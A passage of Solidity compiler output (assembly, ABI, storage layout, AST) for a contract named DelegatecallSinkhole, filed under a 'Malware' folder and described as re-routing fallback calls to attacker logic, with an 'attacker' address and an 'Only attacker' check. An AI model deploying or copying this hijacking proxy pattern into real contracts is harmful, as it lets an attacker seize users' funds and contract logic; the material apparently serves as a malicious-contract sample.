											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 177,
											"end": 201,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 133,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 7,
											"end": 133,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 126,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 77,
											"end": 82,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 73,
											"end": 127,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 139,
											"end": 235,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 176,
											"end": 183,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 223,
											"end": 228,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 205,
											"end": 229,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 241,
											"end": 359,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 346,
											"end": 351,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 328,
											"end": 352,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 328,
											"end": 352,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 326,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 316,
											"end": 353,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 365,
											"end": 587,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 458,
											"end": 462,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 496,
											"end": 498,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 485,
											"end": 494,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 481,
											"end": 499,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 577,
											"end": 578,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 566,
											"end": 575,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 562,
											"end": 579,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 553,
											"end": 559,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 509,
											"end": 580,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 509,
											"end": 580,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 674,
											"end": 791,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 674,
											"end": 791,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 783,
											"end": 784,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 780,
											"end": 781,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 773,
											"end": 785,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 920,
											"end": 1042,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 920,
											"end": 1042,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 993,
											"end": 1017,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1011,
											"end": 1016,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 993,
											"end": 1017,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 993,
											"end": 1017,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 993,
											"end": 1017,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 993,
											"end": 1017,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 986,
											"end": 991,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 983,
											"end": 1018,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 973,
											"end": 1036,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 973,
											"end": 1036,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1032,
											"end": 1033,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1029,
											"end": 1030,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1022,
											"end": 1034,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 973,
											"end": 1036,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 973,
											"end": 1036,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 920,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 920,
											"end": 1042,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1048,
											"end": 1187,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1048,
											"end": 1187,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1094,
											"end": 1099,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1132,
											"end": 1138,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1119,
											"end": 1139,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 1110,
											"end": 1139,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1110,
											"end": 1139,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1148,
											"end": 1181,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1175,
											"end": 1180,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1148,
											"end": 1181,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 1148,
											"end": 1181,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1148,
											"end": 1181,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1148,
											"end": 1181,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1048,
											"end": 1187,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1048,
											"end": 1187,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1048,
											"end": 1187,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1048,
											"end": 1187,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1048,
											"end": 1187,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1193,
											"end": 1522,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1193,
											"end": 1522,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1252,
											"end": 1258,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1301,
											"end": 1303,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1289,
											"end": 1298,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1280,
											"end": 1287,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1276,
											"end": 1299,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1272,
											"end": 1304,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 1269,
											"end": 1388,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1269,
											"end": 1388,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1269,
											"end": 1388,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1307,
											"end": 1386,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1307,
											"end": 1386,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 1307,
											"end": 1386,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1307,
											"end": 1386,
											"name": "tag",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1307,
											"end": 1386,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1269,
											"end": 1388,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1269,
											"end": 1388,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1427,
											"end": 1428,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1452,
											"end": 1505,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1497,
											"end": 1504,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1488,
											"end": 1494,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1477,
											"end": 1486,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1473,
											"end": 1495,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1452,
											"end": 1505,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1452,
											"end": 1505,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1452,
											"end": 1505,
											"name": "tag",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1452,
											"end": 1505,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1442,
											"end": 1505,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1442,
											"end": 1505,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1398,
											"end": 1515,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1193,
											"end": 1522,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1193,
											"end": 1522,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1193,
											"end": 1522,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1193,
											"end": 1522,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1193,
											"end": 1522,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1528,
											"end": 1697,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1528,
											"end": 1697,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1612,
											"end": 1623,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1646,
											"end": 1652,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1641,
											"end": 1644,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1634,
											"end": 1653,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1686,
											"end": 1690,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1681,
											"end": 1684,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1691,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1662,
											"end": 1691,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1662,
											"end": 1691,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1528,
											"end": 1697,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1528,
											"end": 1697,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1528,
											"end": 1697,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1528,
											"end": 1697,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1528,
											"end": 1697,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1703,
											"end": 1866,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1703,
											"end": 1866,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1843,
											"end": 1858,
											"name": "PUSH",
											"source": 1,
											"value": "4F6E6C792061747461636B657200000000000000000000000000000000000000"
										},
										{
											"begin": 1839,
											"end": 1840,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1831,
											"end": 1837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1827,
											"end": 1841,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1820,
											"end": 1859,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1703,
											"end": 1866,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1703,
											"end": 1866,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1872,
											"end": 2238,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1872,
											"end": 2238,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2014,
											"end": 2017,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2035,
											"end": 2102,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 2099,
											"end": 2101,
											"name": "PUSH",
											"source": 1,
											"value": "D"
										},
										{
											"begin": 2094,
											"end": 2097,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2035,
											"end": 2102,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 2035,
											"end": 2102,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2035,
											"end": 2102,
											"name": "tag",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 2035,
											"end": 2102,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2028,
											"end": 2102,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2028,
											"end": 2102,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2111,
											"end": 2204,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2200,
											"end": 2203,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2111,
											"end": 2204,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 2111,
											"end": 2204,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2111,
											"end": 2204,
											"name": "tag",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2111,
											"end": 2204,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2229,
											"end": 2231,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2224,
											"end": 2227,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2220,
											"end": 2232,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2213,
											"end": 2232,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2213,
											"end": 2232,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1872,
											"end": 2238,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1872,
											"end": 2238,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1872,
											"end": 2238,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1872,
											"end": 2238,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2244,
											"end": 2663,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 2244,
											"end": 2663,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2410,
											"end": 2414,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2448,
											"end": 2450,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2437,
											"end": 2446,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2433,
											"end": 2451,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2425,
											"end": 2451,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2425,
											"end": 2451,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2497,
											"end": 2506,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2491,
											"end": 2495,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2487,
											"end": 2507,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 2483,
											"end": 2484,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2472,
											"end": 2481,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2468,
											"end": 2485,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2461,
											"end": 2508,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2525,
											"end": 2656,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 2651,
											"end": 2655,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2525,
											"end": 2656,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2525,
											"end": 2656,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2525,
											"end": 2656,
											"name": "tag",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 2525,
											"end": 2656,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2517,
											"end": 2656,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2517,
											"end": 2656,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2244,
											"end": 2663,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2244,
											"end": 2663,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2244,
											"end": 2663,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2244,
											"end": 2663,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"M/Malware/Delegatecall Sinkhole â€“ Swallows all logic via fallback delegatecall.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"attacker()": "48eb76ee",
							"sinkLogic()": "e062bb05",
							"updateLogic(address)": "795e617e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.26+commit.8a97fa7a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_logic\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_attacker\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"attacker\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sinkLogic\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newLogic\",\"type\":\"address\"}],\"name\":\"updateLogic\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"title\":\"DelegatecallSinkhole - Catches fallback and re-routes to attacker logic\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"M/Malware/Delegatecall Sinkhole \\u2013 Swallows all logic via fallback delegatecall.sol\":\"DelegatecallSinkhole\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"M/Malware/Delegatecall Sinkhole \\u2013 Swallows all logic via fallback delegatecall.sol\":{\"keccak256\":\"0xaffcba87cfec631a030264367d7c4587aedfa4a20bb3ca3e089aa9d96c390bef\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://cd48e7da233e9c1ec4c50db35bc0286114e70d10b1d7aa65ef6803764fea9f4c\",\"dweb:/ipfs/QmQeDPykzwX68cBpaCv2fkVX59hUkY9kusw3Pu7Dbg7yy7\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 4,
								"contract": "M/Malware/Delegatecall Sinkhole â€“ Swallows all logic via fallback delegatecall.sol:DelegatecallSinkhole",
								"label": "sinkLogic",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 6,
								"contract": "M/Malware/Delegatecall Sinkhole â€“ Swallows all logic via fallback delegatecall.sol:DelegatecallSinkhole",
								"label": "attacker",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"M/Malware/Delegatecall Sinkhole â€“ Swallows all logic via fallback delegatecall.sol": {
				"ast": {
					"absolutePath": "M/Malware/Delegatecall Sinkhole â€“ Swallows all logic via fallback delegatecall.sol",
					"exportedSymbols": {
						"DelegatecallSinkhole": [
							50
						]
					},
					"id": 51,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".21"
							],
							"nodeType": "PragmaDirective",
							"src": "32:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "DelegatecallSinkhole",
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "58:83:0",
								"text": "@title DelegatecallSinkhole - Catches fallback and re-routes to attacker logic"
							},
							"fullyImplemented": true,
							"id": 50,
							"linearizedBaseContracts": [
								50
							],
							"name": "DelegatecallSinkhole",
							"nameLocation": "150:20:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e062bb05",
									"id": 4,
									"mutability": "mutable",
									"name": "sinkLogic",
									"nameLocation": "192:9:0",
									"nodeType": "VariableDeclaration",
									"scope": 50,
									"src": "177:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 3,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "177:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "48eb76ee",
									"id": 6,
									"mutability": "mutable",
									"name": "attacker",
									"nameLocation": "222:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 50,
									"src": "207:23:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 5,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "207:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 21,
										"nodeType": "Block",
										"src": "284:65:0",
										"statements": [
											{
												"expression": {
													"id": 15,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 13,
														"name": "sinkLogic",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4,
														"src": "294:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 14,
														"name": "_logic",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "306:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "294:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 16,
												"nodeType": "ExpressionStatement",
												"src": "294:18:0"
											},
											{
												"expression": {
													"id": 19,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 17,
														"name": "attacker",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 6,
														"src": "322:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 18,
														"name": "_attacker",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 10,
														"src": "333:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "322:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 20,
												"nodeType": "ExpressionStatement",
												"src": "322:20:0"
											}
										]
									},
									"id": 22,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 11,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 8,
												"mutability": "mutable",
												"name": "_logic",
												"nameLocation": "257:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 22,
												"src": "249:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 7,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "249:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
